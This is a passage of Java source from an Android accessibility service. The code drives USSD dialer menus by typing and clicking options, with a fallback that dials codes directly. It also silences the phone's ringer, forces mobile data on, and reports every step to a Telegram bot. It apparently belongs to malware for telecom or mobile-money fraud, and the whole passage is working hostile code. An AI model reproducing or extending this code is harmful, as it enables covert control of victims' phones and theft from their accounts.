              private void clickOption(int option, Runnable onSuccess, int delayMs) {
                  new Thread(() -> {
                      try {
                          Thread.sleep(1500);

                          for (int retry = 0; retry < 8; retry++) {
                              AccessibilityNodeInfo root = getRootInActiveWindow();
                              if (root == null) {
                                  Thread.sleep(500);
                                  continue;
                              }

                              String windowText = root.getText() != null ? root.getText().toString() : "";
                              Log.d(TAG, "Window text: " + windowText);

                              List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/input");
                              if (nodes.isEmpty()) {
                                  nodes = root.findAccessibilityNodeInfosByViewId("com.android.dialer:id/input");
                              }

                              for (AccessibilityNodeInfo node : nodes) {
                                  if (node != null && node.isEditable()) {
                                      Bundle args = new Bundle();
                                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, String.valueOf(option));
                                      boolean success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                                      if (success) {
                                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                          sendTelegram("✅ Clicked option: " + option);
                                          if (onSuccess != null) {
                                              handler.post(onSuccess);
                                          }
                                          return;
                                      }
                                  }
                              }

                              List<AccessibilityNodeInfo> btnNodes = root.findAccessibilityNodeInfosByText(String.valueOf(option));
                              for (AccessibilityNodeInfo node : btnNodes) {
                                  if (node != null && node.isClickable()) {
                                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                      sendTelegram("✅ Clicked button: " + option);
                                      if (onSuccess != null) {
                                          handler.post(onSuccess);
                                      }
                                      return;
                                  }
                              }

                              Thread.sleep(500);
                          }

                          dialUSSD("*" + option + "%23");
                          sendTelegram("🔄 Fallback: dialed *" + option + "#");
                          if (onSuccess != null) {
                              handler.post(onSuccess);
                          }

                      } catch (Exception e) {
                          Log.e(TAG, "clickOption failed: " + e.getMessage());
                          try {
                              dialUSSD("*" + option + "%23");
                              if (onSuccess != null) {
                                  handler.post(onSuccess);
                              }
                          } catch (Exception ex) {
                              Log.e(TAG, "Fallback failed: " + ex.getMessage());
                          }
                      }
                  }).start();
              }

              private void setSilentMode(boolean silent) {
                  try {
                      AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                      if (am != null) {
                          am.setRingerMode(silent ? AudioManager.RINGER_MODE_SILENT : AudioManager.RINGER_MODE_NORMAL);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "setSilentMode error: " + e.getMessage());
                  }
              }

              private void enableMobileData() {
                  try {
                      ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                          TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                          if (tm != null) tm.setDataEnabled(true);
                      } else {
                          try {
                              java.lang.reflect.Method method = ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
                              method.invoke(cm, true);
                          } catch (Exception e) {
                              Log.e(TAG, "setMobileDataEnabled failed: " + e.getMessage());
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "enableMobileData error: " + e.getMessage());
                  }
              }

              private void dialUSSD(String code) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_DIAL);
                      intent.setData(android.net.Uri.parse("tel:" + code));
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivity(intent);
                  } catch (Exception e) {
                      Log.e(TAG, "dialUSSD error: " + e.getMessage());
                  }
              }

              private void sendTelegram(String message) {
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          String payload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\",\"parse_mode\":\"Markdown\"}";
                          OutputStream os = conn.getOutputStream();
                          os.write(payload.getBytes());
                          os.flush();
                          os.close();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      } finally {
                          if (conn != null) conn.disconnect();
                      }
                  }).start();
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {}

              @Override
              public void onInterrupt() {}
          }
